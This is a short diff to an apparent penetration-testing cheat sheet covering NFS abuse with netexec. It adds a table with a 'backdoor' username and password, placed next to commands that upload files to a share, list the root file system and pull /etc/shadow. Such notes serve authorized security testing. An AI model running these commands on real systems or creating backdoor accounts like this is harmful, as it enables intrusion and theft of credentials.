@@ -1159,6 +1159,10 @@ $ netexec nfs <RHOST> --put-file <FILE> /PATH/TO/FOLDER/<FILE>
 
 #### Escape to root File System
 
+| Username | Password |
+| --- | --- |
+| backdoor | P@ssword123! |
+
 ```console
 $ netexec nfs <RHOST> --ls '/'
 $ netexec nfs <RHOST> --get-file '/etc/shadow' etc_shadow
